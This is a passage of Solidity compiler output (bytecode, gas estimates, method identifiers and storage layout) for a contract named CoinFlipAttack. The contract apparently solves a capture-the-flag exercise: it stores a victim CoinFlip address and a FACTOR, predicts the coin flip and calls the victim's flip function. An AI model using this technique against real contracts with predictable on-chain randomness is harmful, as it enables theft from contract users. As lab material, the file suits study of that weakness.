SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xF1 SWAP2 SWAP1 PUSH2 0x2CE JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x10D JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x131 SWAP2 SWAP1 PUSH2 0x315 JUMP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x19D PUSH2 0x198 PUSH2 0x193 DUP5 PUSH2 0x15B JUMP JUMPDEST PUSH2 0x17A JUMP JUMPDEST PUSH2 0x15B JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x1AE DUP3 PUSH2 0x183 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x1BF DUP3 PUSH2 0x1A4 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1CF DUP2 PUSH2 0x1B5 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1E8 PUSH0 DUP4 ADD DUP5 PUSH2 0x1C6 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x22E DUP3 PUSH2 0x1EE JUMP JUMPDEST SWAP2 POP PUSH2 0x239 DUP4 PUSH2 0x1EE JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 GT ISZERO PUSH2 0x251 JUMPI PUSH2 0x250 PUSH2 0x1F7 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x28E DUP3 PUSH2 0x1EE JUMP JUMPDEST SWAP2 POP PUSH2 0x299 DUP4 PUSH2 0x1EE JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x2A9 JUMPI PUSH2 0x2A8 PUSH2 0x257 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2C8 DUP2 PUSH2 0x2B4 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2E1 PUSH0 DUP4 ADD DUP5 PUSH2 0x2BF JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x2F4 DUP2 PUSH2 0x2B4 JUMP JUMPDEST DUP2 EQ PUSH2 0x2FE JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x30F DUP2 PUSH2 0x2EB JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x32A JUMPI PUSH2 0x329 PUSH2 0x2E7 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x337 DUP5 DUP3 DUP6 ADD PUSH2 0x301 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SWAP6 MSIZE DUP6 CALLDATALOAD DIV 0xF 0x4D SWAP3 DUP12 DIV CREATE 0xB5 0xF8 PUSH14 0x1082BBC27F747F86C751E11A79E9 0xCE SWAP9 RETURN SWAP7 PUSH5 0x736F6C6343 STOP ADDMOD SHL STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "177200",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"flipAttack()": "infinite",
						"victimContract()": "infinite"
					}
				},
				"methodIdentifiers": {
					"flipAttack()": "987a4e26",
					"victimContract()": "f32d251d"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 87,
						"contract": "contracts/CoinFlipAttack.sol:CoinFlipAttack",
						"label": "victimContract",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(CoinFlip)81"
					},
					{
						"astId": 90,
						"contract": "contracts/CoinFlipAttack.sol:CoinFlipAttack",
						"label": "FACTOR",
						"offset": 0,
						"slot": "1",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_contract(CoinFlip)81": {
						"encoding": "inplace",
						"label": "contract CoinFlip",
						"numberOfBytes": "20"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}